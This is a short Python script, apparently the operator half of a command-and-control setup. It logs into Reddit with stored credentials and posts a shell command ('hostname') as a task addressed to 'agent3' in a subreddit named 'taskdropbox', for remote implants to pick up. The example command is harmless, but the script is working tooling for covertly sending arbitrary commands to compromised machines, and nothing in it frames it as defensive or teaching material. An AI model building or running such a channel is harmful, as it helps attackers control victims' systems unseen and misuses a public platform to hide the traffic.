import praw, json

# Load credentials
with open("config.json") as f:
    creds = json.load(f)

reddit = praw.Reddit(
    client_id=creds["client_id"],
    client_secret=creds["client_secret"],
    username=creds["username"],
    password=creds["password"],
    user_agent=creds["user_agent"]
)

subreddit = reddit.subreddit("taskdropbox")

# Example: send a task
agent_id = "agent3"
command = "hostname"
post = subreddit.submit(title=f"#{agent_id}", selftext=command)

print(f"[+] Posted task for {agent_id}: {command}")
print(f"    URL: {post.url}")
